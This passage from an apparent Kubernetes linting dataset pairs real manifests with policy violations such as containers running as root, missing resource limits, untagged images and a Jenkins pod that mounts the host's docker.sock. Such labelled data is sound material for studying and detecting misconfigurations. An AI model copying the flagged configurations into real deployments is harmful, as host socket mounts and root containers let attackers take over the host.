    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: needs-rebase\n  labels:\n    app: needs-rebase\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: needs-rebase\n  template:\n    metadata:\n      labels:\n        app: needs-rebase\n    spec:\n      containers:\n      - name: needs-rebase\n        image: gcr.io/k8s-prow/needs-rebase:v20210616-1938066492\n        imagePullPolicy: Always\n        args:\n        - --dry-run=false\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --github-token-path=/etc/github/oauth\n        - --update-period=6h\n        ports:\n        - name: http\n          containerPort: 8888\n        volumeMounts:\n        - name: hmac\n          mountPath: /etc/webhook\n          readOnly: true\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: plugins\n          mountPath: /etc/plugins\n          readOnly: true\n      volumes:\n      - name: hmac\n        secret:\n          secretName: hmac-token\n      - name: oauth\n        secret:\n          secretName: oauth-token\n      - name: plugins\n        configMap:\n          name: plugins\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"needs-rebase\" has cpu request 0"
  },
  {
    "id": "2628",
    "manifest_path": "data/manifests/the_stack_sample/sample_0721.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: needs-rebase\n  labels:\n    app: needs-rebase\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: needs-rebase\n  template:\n    metadata:\n      labels:\n        app: needs-rebase\n    spec:\n      containers:\n      - name: needs-rebase\n        image: gcr.io/k8s-prow/needs-rebase:v20210616-1938066492\n        imagePullPolicy: Always\n        args:\n        - --dry-run=false\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --github-token-path=/etc/github/oauth\n        - --update-period=6h\n        ports:\n        - name: http\n          containerPort: 8888\n        volumeMounts:\n        - name: hmac\n          mountPath: /etc/webhook\n          readOnly: true\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: plugins\n          mountPath: /etc/plugins\n          readOnly: true\n      volumes:\n      - name: hmac\n        secret:\n          secretName: hmac-token\n      - name: oauth\n        secret:\n          secretName: oauth-token\n      - name: plugins\n        configMap:\n          name: plugins\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"needs-rebase\" has memory limit 0"
  },
  {
    "id": "2629",
    "manifest_path": "data/manifests/the_stack_sample/sample_0722.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: blog-web-deployment\n  namespace: microservices-namespace\n  labels:\n    app: blog-web-deployment\n    moduleid: microservice-blog-web-service\n    version: 1.70.0-master\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: blog-web-deployment\n  template:\n    metadata:\n      labels:\n        app: blog-web-deployment\n    spec:\n      containers:\n      - name: app\n        image: repoflow/microservice-blog-web-container:1.70.0-master\n        env:\n        - name: HOST\n          value: www.repoflow.com\n        - name: BLOG_BASE_ROUTE_APP\n          value: /blog\n        - name: BLOG_INTERNAL_PORT_APP\n          value: '3000'\n        - name: BLOG_EXTERNAL_URL_GRAPH\n          value: http://www.repoflow.com/blog/backend/graphql\n        - name: BLOG_INTERNAL_URL_GRAPH\n          value: http://blog-graph-service.microservices-namespace:4000/blog/backend/graphql\n        - name: RESOURCES_BASE_ROUTE\n          value: /resources\n        ports:\n        - containerPort: 3000\n",
    "policy_id": "no-anti-affinity",
    "violation_text": "object has 2 replicas but does not specify inter pod anti-affinity"
  },
  {
    "id": "2630",
    "manifest_path": "data/manifests/the_stack_sample/sample_0722.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: blog-web-deployment\n  namespace: microservices-namespace\n  labels:\n    app: blog-web-deployment\n    moduleid: microservice-blog-web-service\n    version: 1.70.0-master\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: blog-web-deployment\n  template:\n    metadata:\n      labels:\n        app: blog-web-deployment\n    spec:\n      containers:\n      - name: app\n        image: repoflow/microservice-blog-web-container:1.70.0-master\n        env:\n        - name: HOST\n          value: www.repoflow.com\n        - name: BLOG_BASE_ROUTE_APP\n          value: /blog\n        - name: BLOG_INTERNAL_PORT_APP\n          value: '3000'\n        - name: BLOG_EXTERNAL_URL_GRAPH\n          value: http://www.repoflow.com/blog/backend/graphql\n        - name: BLOG_INTERNAL_URL_GRAPH\n          value: http://blog-graph-service.microservices-namespace:4000/blog/backend/graphql\n        - name: RESOURCES_BASE_ROUTE\n          value: /resources\n        ports:\n        - containerPort: 3000\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"app\" does not have a read-only root file system"
  },
  {
    "id": "2631",
    "manifest_path": "data/manifests/the_stack_sample/sample_0722.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: blog-web-deployment\n  namespace: microservices-namespace\n  labels:\n    app: blog-web-deployment\n    moduleid: microservice-blog-web-service\n    version: 1.70.0-master\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: blog-web-deployment\n  template:\n    metadata:\n      labels:\n        app: blog-web-deployment\n    spec:\n      containers:\n      - name: app\n        image: repoflow/microservice-blog-web-container:1.70.0-master\n        env:\n        - name: HOST\n          value: www.repoflow.com\n        - name: BLOG_BASE_ROUTE_APP\n          value: /blog\n        - name: BLOG_INTERNAL_PORT_APP\n          value: '3000'\n        - name: BLOG_EXTERNAL_URL_GRAPH\n          value: http://www.repoflow.com/blog/backend/graphql\n        - name: BLOG_INTERNAL_URL_GRAPH\n          value: http://blog-graph-service.microservices-namespace:4000/blog/backend/graphql\n        - name: RESOURCES_BASE_ROUTE\n          value: /resources\n        ports:\n        - containerPort: 3000\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"app\" is not set to runAsNonRoot"
  },
  {
    "id": "2632",
    "manifest_path": "data/manifests/the_stack_sample/sample_0722.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: blog-web-deployment\n  namespace: microservices-namespace\n  labels:\n    app: blog-web-deployment\n    moduleid: microservice-blog-web-service\n    version: 1.70.0-master\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: blog-web-deployment\n  template:\n    metadata:\n      labels:\n        app: blog-web-deployment\n    spec:\n      containers:\n      - name: app\n        image: repoflow/microservice-blog-web-container:1.70.0-master\n        env:\n        - name: HOST\n          value: www.repoflow.com\n        - name: BLOG_BASE_ROUTE_APP\n          value: /blog\n        - name: BLOG_INTERNAL_PORT_APP\n          value: '3000'\n        - name: BLOG_EXTERNAL_URL_GRAPH\n          value: http://www.repoflow.com/blog/backend/graphql\n        - name: BLOG_INTERNAL_URL_GRAPH\n          value: http://blog-graph-service.microservices-namespace:4000/blog/backend/graphql\n        - name: RESOURCES_BASE_ROUTE\n          value: /resources\n        ports:\n        - containerPort: 3000\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"app\" has cpu request 0"
  },
  {
    "id": "2633",
    "manifest_path": "data/manifests/the_stack_sample/sample_0722.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: blog-web-deployment\n  namespace: microservices-namespace\n  labels:\n    app: blog-web-deployment\n    moduleid: microservice-blog-web-service\n    version: 1.70.0-master\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: blog-web-deployment\n  template:\n    metadata:\n      labels:\n        app: blog-web-deployment\n    spec:\n      containers:\n      - name: app\n        image: repoflow/microservice-blog-web-container:1.70.0-master\n        env:\n        - name: HOST\n          value: www.repoflow.com\n        - name: BLOG_BASE_ROUTE_APP\n          value: /blog\n        - name: BLOG_INTERNAL_PORT_APP\n          value: '3000'\n        - name: BLOG_EXTERNAL_URL_GRAPH\n          value: http://www.repoflow.com/blog/backend/graphql\n        - name: BLOG_INTERNAL_URL_GRAPH\n          value: http://blog-graph-service.microservices-namespace:4000/blog/backend/graphql\n        - name: RESOURCES_BASE_ROUTE\n          value: /resources\n        ports:\n        - containerPort: 3000\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"app\" has memory limit 0"
  },
  {
    "id": "2634",
    "manifest_path": "data/manifests/the_stack_sample/sample_0725.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: jenkins-slave\n  labels:\n    name: jenkins-slave\nspec:\n  containers:\n  - name: jenkins-slave\n    image: tjkemper/jnlp-slave:0.4\n    env:\n    - name: JENKINS_URL\n      value: http://100.68.13.101:80\n    volumeMounts:\n    - name: docker-sock\n      mountPath: /var/run/docker.sock\n    - name: config\n      mountPath: /home/jenkins/.kube/\n      readOnly: true\n  volumes:\n  - name: docker-sock\n    hostPath:\n      path: /var/run/docker.sock\n  - name: config\n    secret:\n      secretName: config\n",
    "policy_id": "docker-sock",
    "violation_text": "host system directory \"/var/run/docker.sock\" is mounted on container \"jenkins-slave\""
  },
  {
    "id": "2635",
    "manifest_path": "data/manifests/the_stack_sample/sample_0725.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: jenkins-slave\n  labels:\n    name: jenkins-slave\nspec:\n  containers:\n  - name: jenkins-slave\n    image: tjkemper/jnlp-slave:0.4\n    env:\n    - name: JENKINS_URL\n      value: http://100.68.13.101:80\n    volumeMounts:\n    - name: docker-sock\n      mountPath: /var/run/docker.sock\n    - name: config\n      mountPath: /home/jenkins/.kube/\n      readOnly: true\n  volumes:\n  - name: docker-sock\n    hostPath:\n      path: /var/run/docker.sock\n  - name: config\n    secret:\n      secretName: config\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"jenkins-slave\" does not have a read-only root file system"
  },
  {
    "id": "2636",
    "manifest_path": "data/manifests/the_stack_sample/sample_0725.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: jenkins-slave\n  labels:\n    name: jenkins-slave\nspec:\n  containers:\n  - name: jenkins-slave\n    image: tjkemper/jnlp-slave:0.4\n    env:\n    - name: JENKINS_URL\n      value: http://100.68.13.101:80\n    volumeMounts:\n    - name: docker-sock\n      mountPath: /var/run/docker.sock\n    - name: config\n      mountPath: /home/jenkins/.kube/\n      readOnly: true\n  volumes:\n  - name: docker-sock\n    hostPath:\n      path: /var/run/docker.sock\n  - name: config\n    secret:\n      secretName: config\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"jenkins-slave\" is not set to runAsNonRoot"
  },
  {
    "id": "2637",
    "manifest_path": "data/manifests/the_stack_sample/sample_0725.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: jenkins-slave\n  labels:\n    name: jenkins-slave\nspec:\n  containers:\n  - name: jenkins-slave\n    image: tjkemper/jnlp-slave:0.4\n    env:\n    - name: JENKINS_URL\n      value: http://100.68.13.101:80\n    volumeMounts:\n    - name: docker-sock\n      mountPath: /var/run/docker.sock\n    - name: config\n      mountPath: /home/jenkins/.kube/\n      readOnly: true\n  volumes:\n  - name: docker-sock\n    hostPath:\n      path: /var/run/docker.sock\n  - name: config\n    secret:\n      secretName: config\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"jenkins-slave\" has cpu request 0"
  },
  {
    "id": "2638",
    "manifest_path": "data/manifests/the_stack_sample/sample_0725.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: jenkins-slave\n  labels:\n    name: jenkins-slave\nspec:\n  containers:\n  - name: jenkins-slave\n    image: tjkemper/jnlp-slave:0.4\n    env:\n    - name: JENKINS_URL\n      value: http://100.68.13.101:80\n    volumeMounts:\n    - name: docker-sock\n      mountPath: /var/run/docker.sock\n    - name: config\n      mountPath: /home/jenkins/.kube/\n      readOnly: true\n  volumes:\n  - name: docker-sock\n    hostPath:\n      path: /var/run/docker.sock\n  - name: config\n    secret:\n      secretName: config\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"jenkins-slave\" has memory limit 0"
  },
  {
    "id": "2639",
    "manifest_path": "data/manifests/the_stack_sample/sample_0727.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  name: oxshibboleth\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: oxshibboleth\n  template:\n    spec:\n      containers:\n      - name: oxshibboleth\n        imagePullPolicy: Always\n        image: gluufederation/oxshibboleth:4.0.0\n        command:\n        - /bin/sh\n        - -c\n        - '/usr/bin/python /scripts/update-lb-ip.py &\n\n          /app/scripts/entrypoint.sh\n\n          '\n        volumeMounts:\n        - name: shared-shib\n          mountPath: /opt/shared-shibboleth-idp\n        - name: cb-pass\n          mountPath: /etc/gluu/conf/couchbase_password\n          subPath: couchbase_password\n        - name: cb-crt\n          mountPath: /etc/certs/couchbase.crt\n          subPath: couchbase.crt\n        - mountPath: /scripts\n          name: update-lb-ip\n        resources:\n          requests:\n            memory: 1500Mi\n            cpu: 1000m\n          limits:\n            memory: 2000Mi\n            cpu: 1500m\n        ports:\n        - containerPort: 8080\n        envFrom:\n        - configMapRef:\n            name: oxshibboleth-cm\n        livenessProbe:\n          httpGet:\n            path: /idp\n            port: 8080\n          initialDelaySeconds: 30\n          periodSeconds: 30\n        readinessProbe:\n          httpGet:\n            path: /idp\n            port: 8080\n          initialDelaySeconds: 25\n          periodSeconds: 25\n      volumes:\n      - name: shared-shib\n        persistentVolumeClaim:\n          claimName: shared-shib-pvc\n      - name: cb-pass\n        secret:\n          secretName: cb-pass\n      - name: cb-crt\n        secret:\n          secretName: cb-crt\n      - name: update-lb-ip\n        configMap:\n          name: updatelbip\n",
    "policy_id": "mismatching-selector",
    "violation_text": "labels in pod spec (map[]) do not match labels in selector (&LabelSelector{MatchLabels:map[string]string{app: oxshibboleth,},MatchExpressions:[]LabelSelectorRequirement{},})"
  },
  {
    "id": "2640",
    "manifest_path": "data/manifests/the_stack_sample/sample_0727.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  name: oxshibboleth\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: oxshibboleth\n  template:\n    spec:\n      containers:\n      - name: oxshibboleth\n        imagePullPolicy: Always\n        image: gluufederation/oxshibboleth:4.0.0\n        command:\n        - /bin/sh\n        - -c\n        - '/usr/bin/python /scripts/update-lb-ip.py &\n\n          /app/scripts/entrypoint.sh\n\n          '\n        volumeMounts:\n        - name: shared-shib\n          mountPath: /opt/shared-shibboleth-idp\n        - name: cb-pass\n          mountPath: /etc/gluu/conf/couchbase_password\n          subPath: couchbase_password\n        - name: cb-crt\n          mountPath: /etc/certs/couchbase.crt\n          subPath: couchbase.crt\n        - mountPath: /scripts\n          name: update-lb-ip\n        resources:\n          requests:\n            memory: 1500Mi\n            cpu: 1000m\n          limits:\n            memory: 2000Mi\n            cpu: 1500m\n        ports:\n        - containerPort: 8080\n        envFrom:\n        - configMapRef:\n            name: oxshibboleth-cm\n        livenessProbe:\n          httpGet:\n            path: /idp\n            port: 8080\n          initialDelaySeconds: 30\n          periodSeconds: 30\n        readinessProbe:\n          httpGet:\n            path: /idp\n            port: 8080\n          initialDelaySeconds: 25\n          periodSeconds: 25\n      volumes:\n      - name: shared-shib\n        persistentVolumeClaim:\n          claimName: shared-shib-pvc\n      - name: cb-pass\n        secret:\n          secretName: cb-pass\n      - name: cb-crt\n        secret:\n          secretName: cb-crt\n      - name: update-lb-ip\n        configMap:\n          name: updatelbip\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"oxshibboleth\" does not have a read-only root file system"
  },
  {
    "id": "2641",
    "manifest_path": "data/manifests/the_stack_sample/sample_0727.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  name: oxshibboleth\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: oxshibboleth\n  template:\n    spec:\n      containers:\n      - name: oxshibboleth\n        imagePullPolicy: Always\n        image: gluufederation/oxshibboleth:4.0.0\n        command:\n        - /bin/sh\n        - -c\n        - '/usr/bin/python /scripts/update-lb-ip.py &\n\n          /app/scripts/entrypoint.sh\n\n          '\n        volumeMounts:\n        - name: shared-shib\n          mountPath: /opt/shared-shibboleth-idp\n        - name: cb-pass\n          mountPath: /etc/gluu/conf/couchbase_password\n          subPath: couchbase_password\n        - name: cb-crt\n          mountPath: /etc/certs/couchbase.crt\n          subPath: couchbase.crt\n        - mountPath: /scripts\n          name: update-lb-ip\n        resources:\n          requests:\n            memory: 1500Mi\n            cpu: 1000m\n          limits:\n            memory: 2000Mi\n            cpu: 1500m\n        ports:\n        - containerPort: 8080\n        envFrom:\n        - configMapRef:\n            name: oxshibboleth-cm\n        livenessProbe:\n          httpGet:\n            path: /idp\n            port: 8080\n          initialDelaySeconds: 30\n          periodSeconds: 30\n        readinessProbe:\n          httpGet:\n            path: /idp\n            port: 8080\n          initialDelaySeconds: 25\n          periodSeconds: 25\n      volumes:\n      - name: shared-shib\n        persistentVolumeClaim:\n          claimName: shared-shib-pvc\n      - name: cb-pass\n        secret:\n          secretName: cb-pass\n      - name: cb-crt\n        secret:\n          secretName: cb-crt\n      - name: update-lb-ip\n        configMap:\n          name: updatelbip\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"oxshibboleth\" is not set to runAsNonRoot"
  },
  {
    "id": "2642",
    "manifest_path": "data/manifests/the_stack_sample/sample_0731.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: verify-network\nspec:\n  template:\n    spec:\n      containers:\n      - name: verify-network\n        image: busybox:1.30.1\n        command:\n        - nc\n        args:\n        - -z\n        - kubernetes\n        - '443'\n      affinity:\n        podAntiAffinity:\n          requiredDuringSchedulingIgnoredDuringExecution:\n          - labelSelector:\n              matchExpressions:\n              - key: job-name\n                operator: In\n                values:\n                - verify-network\n            topologyKey: kubernetes.io/hostname\n",
    "policy_id": "job-ttl-seconds-after-finished",
    "violation_text": "Standalone Job does not specify ttlSecondsAfterFinished"
  },
  {
    "id": "2643",
    "manifest_path": "data/manifests/the_stack_sample/sample_0731.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: verify-network\nspec:\n  template:\n    spec:\n      containers:\n      - name: verify-network\n        image: busybox:1.30.1\n        command:\n        - nc\n        args:\n        - -z\n        - kubernetes\n        - '443'\n      affinity:\n        podAntiAffinity:\n          requiredDuringSchedulingIgnoredDuringExecution:\n          - labelSelector:\n              matchExpressions:\n              - key: job-name\n                operator: In\n                values:\n                - verify-network\n            topologyKey: kubernetes.io/hostname\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"verify-network\" does not have a read-only root file system"
  },
  {
    "id": "2644",
    "manifest_path": "data/manifests/the_stack_sample/sample_0731.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: verify-network\nspec:\n  template:\n    spec:\n      containers:\n      - name: verify-network\n        image: busybox:1.30.1\n        command:\n        - nc\n        args:\n        - -z\n        - kubernetes\n        - '443'\n      affinity:\n        podAntiAffinity:\n          requiredDuringSchedulingIgnoredDuringExecution:\n          - labelSelector:\n              matchExpressions:\n              - key: job-name\n                operator: In\n                values:\n                - verify-network\n            topologyKey: kubernetes.io/hostname\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"verify-network\" is not set to runAsNonRoot"
  },
  {
    "id": "2645",
    "manifest_path": "data/manifests/the_stack_sample/sample_0731.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: verify-network\nspec:\n  template:\n    spec:\n      containers:\n      - name: verify-network\n        image: busybox:1.30.1\n        command:\n        - nc\n        args:\n        - -z\n        - kubernetes\n        - '443'\n      affinity:\n        podAntiAffinity:\n          requiredDuringSchedulingIgnoredDuringExecution:\n          - labelSelector:\n              matchExpressions:\n              - key: job-name\n                operator: In\n                values:\n                - verify-network\n            topologyKey: kubernetes.io/hostname\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"verify-network\" has cpu request 0"
  },
  {
    "id": "2646",
    "manifest_path": "data/manifests/the_stack_sample/sample_0731.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: verify-network\nspec:\n  template:\n    spec:\n      containers:\n      - name: verify-network\n        image: busybox:1.30.1\n        command:\n        - nc\n        args:\n        - -z\n        - kubernetes\n        - '443'\n      affinity:\n        podAntiAffinity:\n          requiredDuringSchedulingIgnoredDuringExecution:\n          - labelSelector:\n              matchExpressions:\n              - key: job-name\n                operator: In\n                values:\n                - verify-network\n            topologyKey: kubernetes.io/hostname\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"verify-network\" has memory limit 0"
  },
  {
    "id": "2647",
    "manifest_path": "data/manifests/the_stack_sample/sample_0732.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: demo-daemonset-prod\n  namespace: default\n  labels:\n    app: demo-daemon-prod\nspec:\n  selector:\n    matchLabels:\n      name: demo-daemon-prod\n  template:\n    metadata:\n      labels:\n        name: demo-daemon-prod\n    spec:\n      containers:\n      - name: demo-daemon-prod\n        image: busybox\n        args:\n        - /bin/sh\n        - -c\n        - date; sleep 500\n        resources:\n          limits:\n            memory: 200Mi\n          requests:\n            cpu: 100m\n            memory: 200Mi\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"demo-daemon-prod\" is using an invalid container image, \"busybox\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "2648",
    "manifest_path": "data/manifests/the_stack_sample/sample_0732.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: demo-daemonset-prod\n  namespace: default\n  labels:\n    app: demo-daemon-prod\nspec:\n  selector:\n    matchLabels:\n      name: demo-daemon-prod\n  template:\n    metadata:\n      labels:\n        name: demo-daemon-prod\n    spec:\n      containers:\n      - name: demo-daemon-prod\n        image: busybox\n        args:\n        - /bin/sh\n        - -c\n        - date; sleep 500\n        resources:\n          limits:\n            memory: 200Mi\n          requests:\n            cpu: 100m\n            memory: 200Mi\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"demo-daemon-prod\" does not have a read-only root file system"
  },
  {
    "id": "2649",
    "manifest_path": "data/manifests/the_stack_sample/sample_0732.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: demo-daemonset-prod\n  namespace: default\n  labels:\n    app: demo-daemon-prod\nspec:\n  selector:\n    matchLabels:\n      name: demo-daemon-prod\n  template:\n    metadata:\n      labels:\n        name: demo-daemon-prod\n    spec:\n      containers:\n      - name: demo-daemon-prod\n        image: busybox\n        args:\n        - /bin/sh\n        - -c\n        - date; sleep 500\n        resources:\n          limits:\n            memory: 200Mi\n          requests:\n            cpu: 100m\n            memory: 200Mi\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"demo-daemon-prod\" is not set to runAsNonRoot"
  },
  {
    "id": "2650",
    "manifest_path": "data/manifests/the_stack_sample/sample_0734.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: postgress-pod\n  labels:\n    name: postress-pod\n    app: demo-voting-app\nspec:\n  containers:\n  - name: postgres\n    image: postgres:9.4\n    ports:\n    - containerPort: 5492\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"postgres\" does not have a read-only root file system"
  },
  {
    "id": "2651",
    "manifest_path": "data/manifests/the_stack_sample/sample_0734.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: postgress-pod\n  labels:\n    name: postress-pod\n    app: demo-voting-app\nspec:\n  containers:\n  - name: postgres\n    image: postgres:9.4\n    ports:\n    - containerPort: 5492\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"postgres\" is not set to runAsNonRoot"
  },
  {
    "id": "2652",
    "manifest_path": "data/manifests/the_stack_sample/sample_0734.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: postgress-pod\n  labels:\n    name: postress-pod\n    app: demo-voting-app\nspec:\n  containers:\n  - name: postgres\n    image: postgres:9.4\n    ports:\n    - containerPort: 5492\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"postgres\" has cpu request 0"
  },
  {
    "id": "2653",
    "manifest_path": "data/manifests/the_stack_sample/sample_0734.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: postgress-pod\n  labels:\n    name: postress-pod\n    app: demo-voting-app\nspec:\n  containers:\n  - name: postgres\n    image: postgres:9.4\n    ports:\n    - containerPort: 5492\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"postgres\" has memory limit 0"
  },
  {
    "id": "2654",
    "manifest_path": "data/manifests/the_stack_sample/sample_0735.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: artifact-tracker-server\n  labels:\n    db: pgsql\nspec:\n  selector:\n    matchLabels:\n      name: artifact-tracker-server\n  template:\n    metadata:\n      labels:\n        name: artifact-tracker-server\n    spec:\n      containers:\n      - name: artifact-tracker-server\n        image: gcr.io/pl-dev-infra/cloud/artifact_tracker_server_image\n        ports:\n        - containerPort: 50750\n        readinessProbe:\n          httpGet:\n            scheme: HTTPS\n            path: /healthz\n            port: 50750\n        livenessProbe:\n          httpGet:\n            scheme: HTTPS\n            path: /healthz\n            port: 50750\n        envFrom:\n        - configMapRef:\n            name: pl-db-config\n        - configMapRef:\n            name: pl-tls-config\n        - configMapRef:\n            name: pl-artifact-config\n        - configMapRef:\n            name: pl-domain-config\n        env:\n        - name: PL_JWT_SIGNING_KEY\n          valueFrom:\n            secretKeyRef:\n              name: cloud-auth-secrets\n              key: jwt-signing-key\n        - name: PL_POSTGRES_USERNAME\n          valueFrom:\n            secretKeyRef:\n              name: pl-db-secrets\n              key: PL_POSTGRES_USERNAME\n        - name: PL_POSTGRES_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: pl-db-secrets\n              key: PL_POSTGRES_PASSWORD\n        - name: PL_VIZIER_VERSION\n          value: ''\n        - name: PL_CLI_VERSION\n          value: ''\n        volumeMounts:\n        - name: certs\n          mountPath: /certs\n        - name: artifact-access-sa\n          mountPath: /creds\n          readOnly: true\n      volumes:\n      - name: certs\n        secret:\n          secretName: service-tls-certs\n      - name: artifact-access-sa\n        secret:\n          secretName: artifact-access-sa\n          optional: true\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"artifact-tracker-server\" is using an invalid container image, \"gcr.io/pl-dev-infra/cloud/artifact_tracker_server_image\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "2655",
    "manifest_path": "data/manifests/the_stack_sample/sample_0735.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: artifact-tracker-server\n  labels:\n    db: pgsql\nspec:\n  selector:\n    matchLabels:\n      name: artifact-tracker-server\n  template:\n    metadata:\n      labels:\n        name: artifact-tracker-server\n    spec:\n      containers:\n      - name: artifact-tracker-server\n        image: gcr.io/pl-dev-infra/cloud/artifact_tracker_server_image\n        ports:\n        - containerPort: 50750\n        readinessProbe:\n          httpGet:\n            scheme: HTTPS\n            path: /healthz\n            port: 50750\n        livenessProbe:\n          httpGet:\n            scheme: HTTPS\n            path: /healthz\n            port: 50750\n        envFrom:\n        - configMapRef:\n            name: pl-db-config\n        - configMapRef:\n            name: pl-tls-config\n        - configMapRef:\n            name: pl-artifact-config\n        - configMapRef:\n            name: pl-domain-config\n        env:\n        - name: PL_JWT_SIGNING_KEY\n          valueFrom:\n            secretKeyRef:\n              name: cloud-auth-secrets\n              key: jwt-signing-key\n        - name: PL_POSTGRES_USERNAME\n          valueFrom:\n            secretKeyRef:\n              name: pl-db-secrets\n              key: PL_POSTGRES_USERNAME\n        - name: PL_POSTGRES_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: pl-db-secrets\n              key: PL_POSTGRES_PASSWORD\n        - name: PL_VIZIER_VERSION\n          value: ''\n        - name: PL_CLI_VERSION\n          value: ''\n        volumeMounts:\n        - name: certs\n          mountPath: /certs\n        - name: artifact-access-sa\n          mountPath: /creds\n          readOnly: true\n      volumes:\n      - name: certs\n        secret:\n          secretName: service-tls-certs\n      - name: artifact-access-sa\n        secret:\n          secretName: artifact-access-sa\n          optional: true\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"artifact-tracker-server\" does not have a read-only root file system"
  },
  {
    "id": "2656",
    "manifest_path": "data/manifests/the_stack_sample/sample_0735.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: artifact-tracker-server\n  labels:\n    db: pgsql\nspec:\n  selector:\n    matchLabels:\n      name: artifact-tracker-server\n  template:\n    metadata:\n      labels:\n        name: artifact-tracker-server\n    spec:\n      containers:\n      - name: artifact-tracker-server\n        image: gcr.io/pl-dev-infra/cloud/artifact_tracker_server_image\n        ports:\n        - containerPort: 50750\n        readinessProbe:\n          httpGet:\n            scheme: HTTPS\n            path: /healthz\n            port: 50750\n        livenessProbe:\n          httpGet:\n            scheme: HTTPS\n            path: /healthz\n            port: 50750\n        envFrom:\n        - configMapRef:\n            name: pl-db-config\n        - configMapRef:\n            name: pl-tls-config\n        - configMapRef:\n            name: pl-artifact-config\n        - configMapRef:\n            name: pl-domain-config\n        env:\n        - name: PL_JWT_SIGNING_KEY\n          valueFrom:\n            secretKeyRef:\n              name: cloud-auth-secrets\n              key: jwt-signing-key\n        - 